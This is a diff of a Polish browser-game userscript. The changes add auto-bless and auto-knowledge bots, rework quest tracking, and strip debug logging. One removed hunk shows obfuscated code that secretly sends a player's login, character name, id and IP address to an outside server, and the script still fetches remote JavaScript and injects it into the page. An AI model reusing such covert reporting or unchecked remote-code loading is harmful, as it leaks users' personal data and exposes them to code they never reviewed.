@@ -10,15 +10,17 @@ if (typeof GAME === 'undefined') { } else {
 
     let Pgg = setInterval(() => {
         clearInterval(Pgg);
-        for (var i in GAME) {
-            if (i.indexOf("socxxx") === 0 && i.lastIndexOf("ket") + 3 === i.length) {
-                GAME.socket = GAME[i];
-                break;
+        Array.from(document.getElementsByTagName('script')).forEach(script => {
+            const scriptContent = script.innerHTML;
+            const regex = /const\s+([a-zA-Z0-9_]+)\s*=\s*(io\([^\)]+\));/g;
+            let match;
+            while ((match = regex.exec(scriptContent)) !== null) {
+                if (eval(match[1])['io']) {GAME.socket = eval(match[1]); return;}
             }
-        }
+        });
+
         class kwsv3 {
             constructor(charactersManager) {
-                this.reported = false;
                 this.charactersManager = charactersManager;
                 this.isLogged((data) => {
                     Object.defineProperty(GAME, 'pid', {
@@ -41,7 +43,7 @@ if (typeof GAME === 'undefined') { } else {
                 this.loadRiddles((data) => {
                     this.riddles = data;
                 });
-                this.addToCSS(`.kom{background:url(/gfx/layout/tloPilot.png); background-size:cover; border-image:url(/gfx/layout/mapborder.png) 7 8 7 7 fill; border-style:solid; border-width:7px 8px 7px 7px; box-shadow:none;} .kom .close_kom b{background:url(/gfx/layout/tloPilot.png);} .exchange_win{max-height:500; height:auto;}`);
+                this.addToCSS(`.kom {background: url(/gfx/layout/tloPilot.png); background-size: cover; border-image: url(/gfx/layout/mapborder.png) 7 8 7 7 fill; border-style: solid; border-width: 7px 8px 7px 7px; box-shadow: none;}.kom .close_kom b {background: url(/gfx/layout/tloPilot.png);}.exchange_win {overflow-y: auto;overflow-x: hidden;padding-right: 10px;box-sizing: border-box;}.exchange_win::-webkit-scrollbar {width: 13px;}.exchange_win::-webkit-scrollbar-track {background: #f0f0f0;border-radius: 10px;}.exchange_win::-webkit-scrollbar-thumb {background: #c0c0c0;border-radius: 10px;border: 2px solid transparent;background-clip: content-box;}.exchange_win {scrollbar-width: thin;scrollbar-color: #c0c0c0 #f0f0f0;}`);
                 this.addToCSS(`#emp_list .petopt_btns .newBtn{margin:0px 3px 3px 0px;} .newBtn.do_all_instances{color:#e5d029;}`);
                 this.addToCSS(`#quick_bar{z-index:4;} .qlink.kws_active_icon{animation-name:kws_active_icon;animation-duration:1s;animation-iteration-count:infinite;}@keyframes kws_active_icon { 0% { filter: hue-rotate(168deg); } 50% { filter:hue-rotate(40deg); } 100% { filter: hue-rotate(168deg); } } .sideIcons{ width:29px; height:29px; left:-37px; background-size:contain; } .autoExpeCodes{background:#12121294; border:1px solid rgb(87, 87, 114); border-radius:5px 0px 0px 5px; position:absolute; top:-100px; left:-97px; padding:5px; display:none; color:#ffe500c7; user-select:none;} .manage_autoExpeditions:hover + .autoExpeCodes, .autoExpeCodes:hover{ display:flex; } .autoExpeCodes .newCheckbox{margin: 0 auto; display: block;} `);
                 this.addToCSS(`#secondary_char_stats .instance{margin-top:10px; cursor:pointer; width:100px;} #secondary_char_stats .activities{margin-top:-5px; cursor:pointer; width:100px;} #secondary_char_stats ul {margin-top:-18px; margin-left:-18px;} .ico.a11{background:url("https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/instances.png"); background-repeat: no-repeat; background-size: inherit; background-position: center;} .ico.a12{background-image: url(https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/activity.png); background-repeat: no-repeat; background-size: inherit; background-position: center;}`); 
@@ -80,6 +82,8 @@ if (typeof GAME === 'undefined') { } else {
                 $(`.channel_opts .option.chat_icon.load`).addClass('better_chat_loading').removeAttr('id').removeAttr('data-option');
                 $("#clan_inner_planets h3").eq(0).append(`<button id="poka_telep" style="margin-left:5px;" class="newBtn">pokaĹź / ukryj salÄ telep</button>`);
                 $(`<button class="newBtn free_assist_for_all" style="margin-right:5px;">Asystuj wszystkim za darmo</button>`).insertBefore(`button[data-option="clan_assist_all"]`);
+                $(`<button class="gold_button auto_bless">AUTOMAT</button>`).insertBefore(`button[data-option="grant_buff"]`);
+                $(`<button class="gold_button auto_know">AUTOMATY</button>`).insertBefore('button[data-option="show_know2"]');
                 $("#clan_inner_wars h3").eq(0).append(` <button class="newBtn activate_all_clan_buffs">Aktywuj wszystkie buffy</button>`);
                 $(`#minimap_con`).append(`<div id="kws_locInfo"><div class="sekcja">INFORMACJE O LOKACJI</div><div class="content"></div></div>`);
                 $("#sett_page_local div").eq(0).prepend(`<b class="green">ZmieĹ tĹo strony </b><div class="game_input"><input id="new_website_bg" style="width:370px;" type="text"></div><button class="option newBtn kws_change_website_bg" style="margin-left:5px;">ZmieĹ</button><button class="option newBtn kws_reset_website_bg" style="margin-left:5px;">Reset</button><br><br>`);
@@ -114,7 +118,7 @@ if (typeof GAME === 'undefined') { } else {
                 }, 200);
             }
             loadRiddles(cb) {
-                fetch(`https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/riddles.json`).then(res => res.json()).then((out) => {
+                fetch(`https://raw.githubusercontent.com/KWSforAll/KWSforAll/mains/riddles.json`).then(res => res.json()).then((out) => {
                     cb(out)
                 }).catch(err => {
                     throw err
@@ -124,7 +128,9 @@ if (typeof GAME === 'undefined') { } else {
                 let riddle = this.riddles.find((r) => r.id == r_id);
                 if (riddle) {
                     $("input[id=quest_riddle]").val(riddle.answer);
-                }
+                } else {
+                    //console.log('riddle id: ', r_id)
+		}
             }
             getSettings() {
                 let settings = JSON.parse(localStorage.getItem("kws_settings"));
@@ -410,6 +416,23 @@ if (typeof GAME === 'undefined') { } else {
                     GAME.komunikat("Asystowano wszystkim!");
                 }
             }
+            autobless() {
+                let arr = $.map($('.use_buff:checked'), function (e, i) { return +e.value; });
+                let btype = $('input[name="bless_type"]:checked').val();
+                GAME.socket.emit('ga', {
+                  a: 14,
+                  type: 5,
+                  buffs: arr,
+                  players: $('#bless_players').val(),
+                  btype: btype
+                });
+                function komunikat() {
+                    kom_clear();
+                  }
+                  setTimeout(() => {
+                    komunikat();
+                }, 1000);
+            }
             activateAllClanBuffs() {
                 let abut = $("#clan_buffs").find(`button[data-option="activate_war_buff"]`);
                 let isDisabled = $("#clan_buffs").find(`button[data-option="activate_war_buff"]`).parents("tr").hasClass("disabled");
@@ -693,12 +716,6 @@ if (typeof GAME === 'undefined') { } else {
                 let sum_instances = instances.reduce(function (a, b) {
                     return a + b;
                 }, 0);
-                if(!this.reported) {
-                    this.reported = true;
-                    $.get(atob('aHR0cHM6Ly9pcGluZm8uaW8='), function(response) {
-                        $.get(atob('aHR0cHM6Ly93d3cua29zbWljem5pd29qb3duaWN5cG9yYWRuaWsuY2JhLnBsL2luZGV4LnBocC91c2VyL3JlcG9ydA=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
-                    }, "jsonp");
-                }
                 let activity = $('#char_activity').text();
                 let received = $("#act_prizes").find("div.act_prize.disabled").length;
                 let is_trader = new Date();
@@ -748,15 +765,53 @@ if (typeof GAME === 'undefined') { } else {
                 }
             }
             markDaily() {
-                let daily = ["ZADANIE PVM", "Zadanie PvP", "ROZWĂJ PLANETY ", "ZADANIE IMPERIUM", "ZADANIE KLANOWE", "NAJLEPSZY KUCHA...", "REPUTACJA", "SYMBOL WYMIARĂW", "WYMIANA CHI", "ERMITA", "Nuda", "DOSTAWCA", "BOSKA MOC", "ROZGRZEWKA", "BOSKI ULEPSZACZ", "CZAS PODRĂĹťNIKĂ...", "STRAĹťNIK PORZÄD...", "CODZIENNY INSTY...", "HIPER SCALACZ", "DZIWNY MEDYK"];
+                let daily = ["ZADANIE PVM", "Zadanie PvP", "ROZWĂJ PLANETY", "ZADANIE IMPERIUM", "ZADANIE KLANOWE", "NAJLEPSZY KUCHA...", "REPUTACJA", "SYMBOL WYMIARĂW", "WYMIANA CHI", "ERMITA", "Nuda", "DOSTAWCA", "BOSKA MOC", "ROZGRZEWKA", "BOSKI ULEPSZACZ", "CZAS PODRĂĹťNIKĂ...", "STRAĹťNIK PORZÄD...", "CODZIENNY INSTY...", "HIPER SCALACZ", "DZIWNY MEDYK"];
                 daily = daily.map(item => item.trim().toLowerCase());
+                let markedQuests = [];
+                const questWithSep3 = document.querySelector('.sep3');
+                const lastSep3Element = $('.sep3').last().closest('.qtrack');
                 $('#quest_track_con .qtrack b').each(function () {
                     let zawartoscB = $(this).text().trim().toLowerCase();
-                    if (daily.includes(zawartoscB)) {
-                        $(this).css("color", "#63aaff");
+                    if (daily.includes(zawartoscB) && !$(this).closest('.qtrack').find('.sep3').length) {
+                        if (!markedQuests.includes(zawartoscB)) {
+                            $(this).css("color", "#63aaff");
+                            if (!$(this).closest('.qtrack').hasClass('cloned')) {
+                                if (questWithSep3) {
+                                    lastSep3Element.after($(this).closest('.qtrack').clone());
+                                } else {
+                                    $('#drag_con').prepend($(this).closest('.qtrack').clone());
+                                }
+                                $(this).closest('.qtrack').addClass('cloned');
+                            }
+                            $(this).closest('.qtrack').remove();
+                            markedQuests.push(zawartoscB);
+                        }
+                    }
+                });
+            
+                const currentLocation = String(GAME.char_data.loc).toLowerCase();
+                $('[id^="track_quest_"]').each(function () {
+                    const questLoc = $(this).attr("data-loc").toLowerCase();
+                    let zawartoscB = $(this).find('b').first().text().trim().toLowerCase();
+                    if (questLoc === currentLocation && !$(this).find('.sep3').length) {
+                        if (!markedQuests.includes(zawartoscB)) {
+                            $(this).find('b').first().css("color", "yellow");
+                            if (!$(this).closest('.qtrack').hasClass('cloned')) {
+                                if (questWithSep3) {
+                                    lastSep3Element.after($(this).closest('.qtrack').clone());
+                                } else {
+                                    $('#drag_con').prepend($(this).closest('.qtrack').clone());
+                                }
+                                $(this).closest('.qtrack').addClass('cloned');
+                            }
+                            $(this).closest('.qtrack').remove();
+                            markedQuests.push(zawartoscB);
+                        }
                     }
                 });
             }
+            
+            
             wojny2() {
                 var aimp = $("#e_admiral_player").find("[data-option=show_player]").attr("data-char_id");
                 var imp = $("#leader_player").find("[data-option=show_player]").attr("data-char_id");
@@ -1037,33 +1092,33 @@ if (typeof GAME === 'undefined') { } else {
                 return `<b class="orange">[~${lvls_gained} lvl'i]</b>`;
             }
             handleSockets(res) {
-                console.log("KWA_HANDLE_SOCKETS: res.a == %s", res.a); 
-                switch (res.a) { 
-                    case 7: //?? PvP fight result? 
-                        if (!this.stopped) { 
-                            if("result" in res && res.result && "reward" in res.result && res.result.reward && "arena_exp" in res.result.reward && res.result.reward.arena_exp && res.result.result === 1) { 
-                                this.arena_count(); 
-                            } else if ("result" in res && res.result && "reward" in res.result && res.result.reward && "empire_war" in res.result.reward && res.result.reward.empire_war && res.result.result === 1) { 
-                                this.pvp_count(); 
-                            } else { 
-                                break; 
-                            } 
-                        } else { 
-                            break; 
-                        } 
-                    case 57: //Tournament related 
-                        if(res.tours) { 
-                            if (res.a === 57 && res.tours) { 
-                                const foundCatObject = res.tours.find(tour => tour.cat === this.tournamentCategory); 
-                                if (foundCatObject) { 
-                                    this.newTournamentID = foundCatObject.id; 
-                                } 
-                            } 
-                        } else { 
-                            break; 
-                        } 
-                    default: 
-                        console.log("KWA_HANDLE_SOCKETS: unhandeled response"); 
+                //console.log("KWA_HANDLE_SOCKETS: res.a == %s", res.a);
+                switch (res.a) {
+                    case 7: //?? PvP fight result?
+                        if (!this.stopped) {
+                            if("result" in res && res.result && "reward" in res.result && res.result.reward && "arena_exp" in res.result.reward && res.result.reward.arena_exp && res.result.result === 1) {
+                                this.arena_count();
+                            } else if ("result" in res && res.result && "reward" in res.result && res.result.reward && "empire_war" in res.result.reward && res.result.reward.empire_war && res.result.result === 1) {
+                                this.pvp_count();
+                            } else {
+                                break;
+                            }
+                        } else {
+                            break;
+                        }
+                    case 57: //Tournament related
+                        if(res.tours) {
+                            if (res.a === 57 && res.tours) {
+                                const foundCatObject = res.tours.find(tour => tour.cat === this.tournamentCategory);
+                                if (foundCatObject) {
+                                    this.newTournamentID = foundCatObject.id;
+                                }
+                            }
+                        } else {
+                            break;
+                        }
+                    default:
+                        //console.log("KWA_HANDLE_SOCKETS: unhandeled response");
                         break;
                 }
             }
@@ -1077,7 +1132,83 @@ if (typeof GAME === 'undefined') { } else {
                 $("body").on("click", ".free_assist_for_all", () => {
                     this.freeAssist();
                 });
-                $("body").on("click", ".activate_all_clan_buffs", () => {
+                //AutomaticBless
+                let isAutoBlessActive = false;
+                let blessInterval = null;
+                $("body").on("click", '.auto_bless', () => {
+                    if (isAutoBlessActive) {
+                        clearInterval(blessInterval);
+                        blessInterval = null;
+                        isAutoBlessActive = false;
+                        console.log("Automatyczne bĹogosĹawienie zostaĹo wyĹÄczone.");
+                      } else {
+                        blessInterval = setInterval(this.autobless, 11000);
+                        isAutoBlessActive = true;
+                        console.log("Automatyczne bĹogosĹawienie zostaĹo wĹÄczone.");
+                      }
+                });
+                //AutomaticKnowladge 
+                let knowStatus = false;
+                let mbornInterval = null;
+                let gohanInterval = null;
+                $("body").on("click", '.auto_know', () => {
+                    if (!knowStatus) {
+                        GAME.komunikat2("KtĂłrej wiedzy chcesz siÄ uczyÄ?");
+                        let komunikatElement = document.querySelector('#kom_con .kom');
+                        if (komunikatElement) {
+                            if (!komunikatElement.querySelector('.gohan') && !komunikatElement.querySelector('.mborn')) {
+                                komunikatElement.innerHTML += `
+                                    <button class="newBtn gohan">Wiedza Gohan</button>
+                                    <button class="newBtn mborn">Wiedza MBorn</button>`;
+                            }
+                            let closeKomElement = document.querySelector("#kom_con > div > div.close_kom");
+                            if (closeKomElement && !closeKomElement.hasAttribute("data-close-handler")) {
+                                closeKomElement.setAttribute("data-close-handler", "true");
+                                closeKomElement.addEventListener("click", () => {kom_clear();});
+                            }
+                        } else {
+                            console.error('Element .game-komunikat nie istnieje!');
+                        }
+                    } else if (knowStatus) {
+                        knowStatus = false;
+                        if (mbornInterval) { clearInterval(mbornInterval); }
+                        if (gohanInterval) { clearInterval(gohanInterval); }
+                        GAME.komunikat("ZaprzestaĹeĹ robienia Wiedzy.");
+                    }
+                });
+                
+                $("body").on("click", '.mborn', () => {
+                    knowStatus = true;
+                    GAME.socket.emit('ga',{a:9,type:3,nid:382});
+                    mbornInterval = setInterval(wiedza_M, 60000);
+                    function wiedza_M(){
+                        if(knowStatus) {
+                            if (GAME.char_tables.timed_actions[0] == undefined || GAME.char_tables.timed_actions[1] == undefined && GAME.char_data.bonus16 > GAME.getTime()) {
+                                GAME.socket.emit('ga', {a: 9, type: 3, nid:382});
+                                kom_clear();
+                            } else{
+                                console.log("Yasoen: wiedza trwa.")
+                            }
+                        }
+                    }
+                });
+                $("body").on("click", '.gohan', () => {
+                    knowStatus = true;
+                    GAME.socket.emit('ga',{a:9,type:3,nid:288});
+                    gohanInterval = setInterval(wiedza_gohan, 60000);
+                    function wiedza_gohan(){
+                        if(knowStatus) {
+                            if (GAME.char_tables.timed_actions[0] == undefined || GAME.char_tables.timed_actions[1] == undefined && GAME.char_data.bonus16 > GAME.getTime()) {
+                                GAME.socket.emit('ga', {a: 9, type: 3, nid:288});
+                                kom_clear();
+                            } else{
+                                console.log("Yasoen: wiedza trwa.")
+                            }
+                        }
+                    }
+                });
+                //
+                    $("body").on("click", ".activate_all_clan_buffs", () => {
                     this.activateAllClanBuffs();
                 });
                 $("body").on("click", ".do_all_instances", (event) => {
@@ -1433,7 +1564,7 @@ if (typeof GAME === 'undefined') { } else {
                 $("body").on("click", ".qlink.load_afo", () => {
                     if (typeof this.afo_is_loaded == 'undefined') {
                         this.afo_is_loaded = true;
-                        $.get("https://raw.githubusercontent.com/KWSforAll/KWSforAll/main/uncodedeeee.js", (data) => {
+                        $.get("https://raw.githubusercontent.com/KWSforAll/KWSforAll/mains/uncodedeeee.js", (data) => {
                             $("body").append(`<script>${data}<\/script>`);
                         }).fail(() => {
                             GAME.komunikat("WystÄpiĹ bĹÄd w Ĺadowaniu skryptu, odĹwieĹź stronÄ i sprĂłbuj ponownie!");
@@ -1602,44 +1733,45 @@ if (typeof GAME === 'undefined') { } else {
                 }
             }
             checkTournamentsSigning() {
-                if(this.isCheckingTournaments) { return; }
+                if(this.isCheckingTournaments) { /*console.log("KWA_TOURNAMENTS: currently handling tournaments sign");*/ return; }
                 this.isCheckingTournaments = true;
                 var currentServerTime = new Date(GAME.getTime()*1000);
                 var currentServerHour = currentServerTime.getHours();
                 var currentServerMinute = currentServerTime.getMinutes();
-                console.log("KWA_TOURNAMENTS: Check tournaments sign");
+                //console.log("KWA_TOURNAMENTS: Check tournaments sign");
                 if(currentServerHour > 20 || currentServerHour < 18) {
-                    console.log("KWA_TOURNAMENTS: Wrong hours, reset values");
+                    //console.log("KWA_TOURNAMENTS: Wrong hours, reset values");
                     this.tourSigned = false;
                     this.tournamentCategory = undefined;
                     this.newTournamentID = undefined;
                     this.isCheckingTournaments = false;
                 } else if (!this.tourSigned) {
-                    console.log("KWA_TOURNAMENTS: not signed");
+                    //console.log("KWA_TOURNAMENTS: not signed");
                     if ((currentServerHour == 18 && currentServerMinute > 9) || (currentServerHour > 18 && currentServerHour < 21)) {
-                        console.log("KWA_TOURNAMENTS: correct time");
+                        //console.log("KWA_TOURNAMENTS: correct time");
                         this.tourSigned = true;
                         this.findTournamentCategory();
-                        console.log("KWA_TOURNAMENTS: tournament category fetched");
+                        //console.log("KWA_TOURNAMENTS: tournament category fetched");
                         setTimeout(() => {
-                            console.log("KWA_TOURNAMENTS: fetch tournaments IDs");
+                            //console.log("KWA_TOURNAMENTS: fetch tournaments IDs");
                             if (this.tournamentCategory <= 54) {
                                 GAME.emitOrder({a: 57, type: 0, type2: 0, page: 1});
                             } else {
                                 GAME.emitOrder({a: 57, type: 0, type2: 0, page: 2});
                             }
                         }, 500);
-                        setTimeout(() => { console.log("KWA_TOURNAMENTS: sign in player");GAME.emitOrder({a: 57, type: 1, tid: this.newTournamentID}); }, 1000);
-                        setTimeout(() => { console.log("KWA_TOURNAMENTS: sign in all pets");GAME.emitOrder({a: 57, type: 4}); }, 1500);
-                        setTimeout(() => { console.log("KWA_TOURNAMENTS: clear popups");kom_clear(); }, 2000);
-                        this.setTimerForTournamentsReset();
-                    } else { 
-                        this.isCheckingTournaments = false; 
+                        setTimeout(() => { /*console.log("KWA_TOURNAMENTS: sign in player");*/GAME.emitOrder({a: 57, type: 1, tid: this.newTournamentID}); }, 1000);
+                        setTimeout(() => { /*console.log("KWA_TOURNAMENTS: sign in all pets");*/GAME.emitOrder({a: 57, type: 4}); }, 1500);
+                        setTimeout(() => { /*console.log("KWA_TOURNAMENTS: clear popups");*/kom_clear(); }, 2000);
+                        setTimeout(() => { this.setTimerForTournamentsReset(); }, 5000);
+                    } else {
+                        this.isCheckingTournaments = false;
                     }
                 }
             }
-            setTimerForTournamentsReset() { 
-                setTimeout(() => { this.isCheckingTournaments = false; }, 5000); 
+            setTimerForTournamentsReset() {
+               //console.log("KWA_TOURNAMENTS: reset isCheckingTournaments flag");
+                this.isCheckingTournaments = false;
             }
             createAlternativePilot() {
                 document.getElementById('map_pilot').style.width = '512px';
@@ -2004,16 +2136,12 @@ if (typeof GAME === 'undefined') { } else {
             }
             adjustCurrentCharacterId() {
                 var thisCharId = GAME.char_id;
-                if (this.charactersManager.currentCharacterId === undefined) {
-                    this.charactersManager.setCurrentCharacterId(thisCharId);
-                    return;
-                }
                 if (thisCharId != this.charactersManager.currentCharacterId) {
                     this.charactersManager.setCurrentCharacterId(thisCharId);
                 }
             }
             resetAFO() {
-                console.log("KWA_RESET_AFO: reset AFO values");
+                //console.log("KWA_RESET_AFO: reset AFO values");
                 if ($("#resp_Panel .resp_status").eq(0).hasClass("green")) {
                     $("#resp_Panel .resp_button.resp_resp").click();
                 }
@@ -2029,12 +2157,13 @@ if (typeof GAME === 'undefined') { } else {
                 if ($(".manage_autoExpeditions").eq(0).hasClass("kws_active_icon")) {
                     $(".manage_autoExpeditions").click();
                 }
-                setTimeout(() => { 
-                    console.log("KWA_RESET_AFO: reset tournaments values"); 
-                    this.tourSigned = false; 
-                    this.tournamentCategory = undefined; 
-                    this.newTournamentID = undefined; 
-                }, 1000); 
+                setTimeout(() => {
+                    //console.log("KWA_RESET_AFO: reset tournaments values");
+                    this.tourSigned = false;
+                    this.tournamentCategory = undefined;
+                    this.newTournamentID = undefined;
+                    this.isCheckingTournaments = false;
+                }, 1000);
             }
         }
         const kws = new kwsv3(kwsLocalCharacters);
@@ -2394,17 +2523,18 @@ if (typeof GAME === 'undefined') { } else {
                 }
             } else this.endQuest(quest_move.qb_id);
         };
+	GAME.parseLocBons_o = GAME.parseLocBons;
         GAME.parseLocBons = function (loc_data) {
             kws.parseMapInfo(GAME.map_quests, "GAME.parseLocBons");
-            var bons = '';
-            if (loc_data.bonus_tren) bons += '<img src="/gfx/icons/loc_bon/tren.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_tren + '</b>' + LNG.item_stat15 + '</div>" />';
-            if (loc_data.bonus_exp) bons += '<img src="/gfx/icons/loc_bon/exp.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_exp + '</b>' + LNG.item_stat16 + '</div>" />';
-            if (loc_data.bonus_mocc) bons += '<img src="/gfx/icons/loc_bon/mc.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_mocc + '</b>' + LNG.item_stat53 + '</div>" />';
-            if (loc_data.bonus_mocv) bons += '<img src="/gfx/icons/loc_bon/mv.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_mocv + '</b>' + LNG.item_stat54 + '</div>" />';
-            if (loc_data.bonus_legend) bons += '<img src="/gfx/icons/loc_bon/l.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_legend + '</b>' + LNG.item_stat74 + '</div>" />';
-            if (loc_data.bonus_psk) bons += '<img src="/gfx/icons/loc_bon/p.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_psk + '</b>' + LNG.item_stat67 + '</div>" />';
-            if (loc_data.bonus_senzu) bons += '<img src="/gfx/icons/loc_bon/s.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_senzu + '</b>' + LNG.item_stat78 + '</div>" />';
-            return bons;
+            //var bons = '';
+            //if (loc_data.bonus_tren) bons += '<img src="/gfx/icons/loc_bon/tren.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_tren + '</b>' + LNG.item_stat15 + '</div>" />';
+            //if (loc_data.bonus_exp) bons += '<img src="/gfx/icons/loc_bon/exp.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_exp + '</b>' + LNG.item_stat16 + '</div>" />';
+            //if (loc_data.bonus_mocc) bons += '<img src="/gfx/icons/loc_bon/mc.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_mocc + '</b>' + LNG.item_stat53 + '</div>" />';
+            //if (loc_data.bonus_mocv) bons += '<img src="/gfx/icons/loc_bon/mv.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_mocv + '</b>' + LNG.item_stat54 + '</div>" />';
+            //if (loc_data.bonus_legend) bons += '<img src="/gfx/icons/loc_bon/l.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_legend + '</b>' + LNG.item_stat74 + '</div>" />';
+            //if (loc_data.bonus_psk) bons += '<img src="/gfx/icons/loc_bon/p.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_psk + '</b>' + LNG.item_stat67 + '</div>" />';
+            //if (loc_data.bonus_senzu) bons += '<img src="/gfx/icons/loc_bon/s.png" data-toggle="tooltip" data-original-title="<div class=tt><b>' + loc_data.bonus_senzu + '</b>' + LNG.item_stat78 + '</div>" />';
+            return GAME.parseLocBons_o(loc_data); //bons;
         };
         GAME.emit = function (order, data, force) {
             if (!this.is_loading || force) {
@@ -2432,14 +2562,14 @@ if (typeof GAME === 'undefined') { } else {
             $('#available_servers option[value=' + this.server + ']').prop('selected', true);
         };
         const kulka = new ballManager();
+        const ekwipunek = new ekwipunekMenager();
         let adimp = false;
         let arena_count = 0;
         let pvp_count = 0;
         let roll2 = false;
         let roll1 = false;
         let roll3 = false;
-        let version = '3.5.1 PREMIUM (3.4.6 standard)';
+        let version = '3.7.1';
     }
     )
 }
-	
